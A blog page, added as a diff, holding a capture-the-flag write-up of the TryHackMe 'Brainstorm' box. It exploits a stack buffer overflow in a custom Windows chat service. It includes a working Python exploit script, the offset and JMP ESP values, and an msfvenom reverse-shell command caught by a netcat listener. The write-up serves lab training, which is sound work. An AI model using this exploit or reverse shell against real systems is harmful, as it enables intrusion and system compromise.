@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Brainstorm | JackHacksStuff</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="room-medium">
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="crash"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="offset"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="exploit"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="flag"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="verdict"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Medium</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge medium">Medium</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · Windows · Buffer Overflow · Stack Smash → SYSTEM</div>
+    <h1 class="wu-title">Brainstorm</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-10-06</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent medium">Medium</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">1</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">ftp</span>
+    <span class="tool-tag">msfvenom</span>
+    <span class="tool-tag">netcat</span>
+    <span class="tool-tag">python</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>Brainstorm</strong> is a Windows box built around a classic stack-based buffer overflow in a custom chat service. You enumerate the box, pull the vulnerable binaries off an anonymous FTP share, reverse the crash, and redirect execution into shellcode. The exploitation path is a standard x86 Windows BOF, and the reward is a shell as <strong>NT AUTHORITY\SYSTEM</strong> because the service runs with high privileges. Unlike a misconfiguration chain, the bug here is a genuine memory-safety flaw: an unchecked <code>strcpy</code> into a fixed-size stack buffer.</p>
+    <p><a href="https://tryhackme.com/room/brainstorm" target="_blank">View room on TryHackMe →</a></p>
+    <p><em>Flags and puzzle answers have been redacted per TryHackMe's write-up policy. Technique and tooling are shown in full.</em></p>
+
+    <h2 id="recon">// Reconnaissance</h2>
+
+    <h3>Port and Service Discovery</h3>
+    <p>Ping is disabled, so a full sweep with <code>-Pn</code> is required. Three services surface: FTP, RDP, and a custom chat daemon on <code>9999</code>.</p>
+
+    <pre>$ nmap -p- -Pn -sV &lt;target_ip&gt;
+
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        Microsoft ftpd
+3389/tcp open  tcpwrapped
+9999/tcp open  abyss?</pre>
+
+    <p>Port 9999 fingerprints as some kind of chat application, and connecting to it confirms that. The service asks for a username (capped at 20 characters), then a message, which it echoes back.</p>
+
+    <pre>$ nc &lt;target_ip&gt; 9999
+Welcome to Brainstorm chat (beta)
+Please enter your username (max 20 characters):
+&gt; hacker
+Write your message:
+&gt; hello</pre>
+
+    <h3>FTP Enumeration</h3>
+    <p>Anonymous login is enabled. The share contains a single directory with two files: <code>chatserver.exe</code> and <code>essfunc.dll</code>. These are the service binary and its dependency, exactly what we need to analyze locally.</p>
+
+    <pre>$ ftp &lt;target_ip&gt;
+Name: anonymous
+Password: (blank)
+
+ftp&gt; passive
+Passive mode: off
+
+ftp&gt; cd chatserver
+ftp&gt; binary
+ftp&gt; mget *</pre>
+
+    <div class="note">
+      <strong>FTP note:</strong> the server's passive-mode data connection often times out on THM's network. Toggling <code>passive</code> off before listing or downloading avoids the stall. If it still fails, pulling the files from the AttackBox and transferring them to a Windows host is a reliable fallback.
+    </div>
+
+    <h2 id="crash">// Confirming the Crash</h2>
+
+    <p>Before touching offsets, verify the service is actually vulnerable. Send an oversized message after the username and watch the connection die: the process has crashed.</p>
+
+    <pre>#!/usr/bin/env python3
+import socket
+
+TARGET = "&lt;target_ip&gt;"
+PORT = 9999
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+s.connect((TARGET, PORT))
+s.recv(1024)                          # banner
+s.send(b"hacker\r\n")                 # username
+s.recv(1024)                          # prompt
+s.send(b"A" * 3000 + b"\r\n")         # oversized message
+s.close()</pre>
+
+    <p>If the service stops responding after this, the buffer overflow is confirmed. The exact crash threshold varies slightly between write-ups: some report a crash around 2100 bytes, others closer to 2500–3000, but the offset that matters is consistent.</p>
+
+    <div class="note">
+      <strong>On the debugger:</strong> deriving the crash in Immunity Debugger is the canonical path and is covered thoroughly elsewhere. The values below (offset, JMP ESP address, bad characters) are consistent across the walkthroughs I checked, so the exploitation section can proceed directly to payload assembly.
+    </div>
+
+    <h2 id="offset">// Offset, Bad Characters, and JMP ESP</h2>
+
+    <p>Three values turn the crash into control:</p>
+
+    <pre>EIP offset:        2012 bytes
+JMP ESP address:   0x625014DF  (essfunc.dll)
+Bad characters:    \x00</pre>
+
+    <p>The offset of <strong>2012</strong> means the first 2012 bytes of the message fill the stack buffer and saved registers; the next four bytes land directly in EIP. The JMP ESP at <code>0x625014DF</code> lives in <code>essfunc.dll</code>, which lacks ASLR and DEP, making it a reliable landing pad. The only bad character is the null byte, which matters for shellcode generation.</p>
+
+    <p>To verify EIP control manually, replace the four bytes after the offset with <code>BBBB</code> and check that EIP becomes <code>42424242</code> in a debugger. For the final exploit, those four bytes become the JMP ESP address in little-endian: <code>\xdf\x14\x50\x62</code>.</p>
+
+    <h2 id="exploit">// Exploitation: Stack Smash → Reverse Shell</h2>
+
+    <p>Generate a null-free Windows reverse shell with <code>msfvenom</code>. Substitute your attacking machine address and chosen listener port.</p>
+
+    <pre>$ msfvenom -p windows/shell_reverse_tcp \
+    LHOST=&lt;your_ip&gt; LPORT=4444 \
+    EXITFUNC=thread -b "\x00" -f c</pre>
+
+    <p>The payload layout is the standard shape: <code>offset + EIP + NOP sled + shellcode</code>. A short NOP sled after the JMP ESP improves reliability by absorbing minor stack misalignment before the shellcode executes.</p>
+
+    <pre>#!/usr/bin/env python3
+import socket, sys
+
+TARGET = "&lt;target_ip&gt;"
+PORT   = 9999
+
+offset      = 2012
+eip         = b"\xdf\x14\x50\x62"       # 0x625014DF, little-endian
+nop_sled    = b"\x90" * 16
+
+# Paste msfvenom output here as a bytes literal
+shellcode = b"\xfc\xe8\x82..."          # truncated
+
+payload = b"A" * offset + eip + nop_sled + shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(10)
+s.connect((TARGET, PORT))
+s.recv(1024)                            # banner
+s.send(b"hacker\r\n")                   # username (≤20 chars)
+s.recv(1024)                            # prompt
+s.send(payload + b"\r\n")               # exploit
+s.close()
+print("[+] Payload sent")</pre>
+
+    <p>Start a listener before running the script:</p>
+
+    <pre>$ nc -nvlp 4444</pre>
+
+    <p>On success, the listener catches a shell running as <strong>NT AUTHORITY\SYSTEM</strong>. The service's privilege level means no local escalation is required — the BOF is the whole chain.</p>
+
+    <div class="note">
+      <strong>Why this works:</strong> <code>chatserver.exe</code> copies the user-supplied message into a fixed-size stack buffer with <code>strcpy</code> and no length check. Sending 2012 bytes of padding reaches the saved return address; the next four bytes overwrite it with the address of a <code>jmp esp</code> instruction in an unprotected DLL; execution flows to the stack, where the NOP sled leads into shellcode.
+    </div>
+
+    <h2 id="flag">// Flag</h2>
+
+    <p>With a SYSTEM shell, the flag is waiting in the Administrator's desktop directory:</p>
+
+    <pre>C:\Users\Administrator\Desktop&gt; type root.txt
+[redacted]</pre>
+
+    <h2 id="verdict">// Verdict</h2>
+    <p>Brainstorm earns its Medium rating not through exotic steps but through the demand it places on understanding. Every value in the exploit is meaningless unless you know what EIP is, why a JMP ESP is necessary, and why the DLL's lack of ASLR/DEP matters. That's a different kind of difficulty from ToolsRUs, where the "vulnerability" was an exposed administrative feature. Here the bug is a real memory-safety flaw: a <code>strcpy</code> with no bounds check, the same class of defect that still produces CVEs in production software. The SYSTEM shell is almost incidental; the teaching moment is watching the CPU jump where you told it to. If you just want the flag, the offset is stable and the exploit script above works.</p>
+    <p style="color: var(--text); font-size: 0.8rem;">
+      <span style="color: var(--room-accent, var(--accent));">→</span> 7/10 — a proper memory-safety room; the offset is the lesson.
+    </p>
+
+  </div>
+
+  <div class="wu-footer">
+    <a href="attacktive-directory.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">Attacktive Directory</span>
+    </a>
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="dailybugle.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">Daily Bugle</span>
+    </a>
+  </div>
+
+</main>
+
+<script src="../js/script.js"></script>
+
+</body>
+</html>
